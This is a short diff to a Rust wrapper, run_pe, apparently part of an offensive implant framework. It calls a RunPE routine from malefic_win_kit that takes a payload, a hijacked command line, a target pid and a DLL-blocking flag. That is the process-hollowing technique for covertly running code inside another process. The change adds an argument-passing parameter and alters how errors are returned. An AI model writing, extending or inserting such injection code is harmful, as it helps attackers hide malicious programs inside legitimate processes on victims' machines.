@@ -1,10 +1,9 @@
-use crate::common::convert_u8p2vec;
-
 pub unsafe fn run_pe(
     start_commandline: &[u8],
     hijack_commandline: &[u8],
     data: &[u8],
     entrypoint: &[u8],
+    args: &[u8],
     is_x86: bool,
     pid: u32,
     block_dll: bool,
@@ -21,17 +20,19 @@ pub unsafe fn run_pe(
             data.len(),
             entrypoint.as_ptr(),
             entrypoint.len(),
+            args.as_ptr(),
+            args.len(),
             is_x86,
             pid,
             block_dll,
             need_output
         );
-        convert_u8p2vec(ret)
+        let str = String::from_raw_parts(ret.data, ret.len, ret.capacity);
+        str.as_bytes().to_vec()
     }
     #[cfg(feature = "source")]
     {
         use malefic_win_kit::pe::RunPE::RunPE;
-        use prost::Message;
         match RunPE(
             start_commandline.as_ptr(),
             start_commandline.len(),
@@ -41,6 +42,8 @@ pub unsafe fn run_pe(
             data.len(),
             entrypoint.as_ptr(),
             entrypoint.len(),
+            args.as_ptr(),
+            args.len(),
             is_x86,
             pid,
             block_dll,
@@ -50,7 +53,7 @@ pub unsafe fn run_pe(
                 ret
             },
             Err(e) => {
-                e.encode_to_vec()
+                e.as_bytes().to_vec()
             }
         }
     }
